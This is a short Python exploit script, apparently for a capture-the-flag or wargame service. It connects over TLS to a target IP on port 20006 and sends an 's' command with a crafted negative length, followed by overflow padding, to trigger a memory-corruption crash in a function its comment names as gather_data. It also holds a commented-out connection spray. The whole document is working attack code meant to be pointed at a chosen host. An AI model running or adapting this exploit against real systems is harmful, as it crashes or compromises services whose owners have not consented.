'''
the vulnerability is at s command, function gather_data
the u command isn't documented in h command, it seems useful because it can be
blocked.
'''
from socket import *
from tlslite.api import *

PORT = 20006

class Exploit(object):
    def __init__(self, ip):
        self.s = create_connection((ip, PORT))
        self.s = TLSConnection(self.s)
        self.s.handshakeClientCert()

        banner = self.readline()

    def readline(self):
        res = []
        while True:
            c = self.s.recv(1)
            if c == b'':
                break
            res.append(c)
            if c == b'\n':
                break
        return b''.join(res)

    def close(self):
        self.s.close()

    def trigger_crash(self):
        v = b'A' * (0x3c - 0x30) + b'BBBB'
        self.s.send(b's foobar %d\n' % (-(0x1e + 0x3c - 0x20)))
        # self.s.send(b's foobar %d\n' % (-(0x1e + 0x3c - 0x20)))
        self.s.send(v)

def main():
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument('ip')
    args = parser.parse_args()

    # lazy spray
    # dummy = [Exploit(args.ip) for i in range(100)]

    e = Exploit(args.ip)
    e.trigger_crash()
    e.close()

if __name__ == '__main__':
    main()

